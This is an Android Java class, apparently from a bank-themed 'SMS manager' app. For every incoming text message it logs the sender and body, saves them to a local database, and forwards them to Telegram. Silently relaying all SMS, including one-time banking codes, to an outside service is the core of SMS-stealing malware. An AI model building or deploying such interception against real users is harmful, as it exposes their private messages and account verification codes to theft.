package com.example.geekbank_sms_manager;

import android.content.BroadcastReceiver;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.database.sqlite.SQLiteDatabase;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

public class SmsReceiver extends BroadcastReceiver {

    private static final String TAG = "SmsReceiver";
    private DatabaseHelper dbHelper;
    private TelegramService telegramService;

    @Override
    public void onReceive(Context context, Intent intent) {
        Log.d(TAG, "onReceive: SMS received");
        Bundle bundle = intent.getExtras();
        if (bundle != null) {
            Object[] pdus = (Object[]) bundle.get("pdus");
            SmsMessage[] msgs = new SmsMessage[pdus.length];
            dbHelper = new DatabaseHelper(context);
            telegramService = new TelegramService();
            SQLiteDatabase db = dbHelper.getWritableDatabase();
            for (int i = 0; i < msgs.length; i++) {
                msgs[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
                String phoneNumber = msgs[i].getOriginatingAddress();
                String messageBody = msgs[i].getMessageBody();
                String date = String.valueOf(System.currentTimeMillis());

                Log.d(TAG, "SMS from " + phoneNumber + " : " + messageBody);

                // Insertar mensaje en la base de datos
                ContentValues values = new ContentValues();
                values.put(DatabaseHelper.COLUMN_PHONE_NUMBER, phoneNumber);
                values.put(DatabaseHelper.COLUMN_MESSAGE_BODY, messageBody);
                values.put(DatabaseHelper.COLUMN_DATE, date);
                db.insert(DatabaseHelper.TABLE_SMS, null, values);

                // Enviar mensaje a Telegram
                String formattedMessage = "Message from " + phoneNumber + ": " + messageBody;
                telegramService.sendToTelegram(context, formattedMessage);
            }
            db.close();
        }
    }
}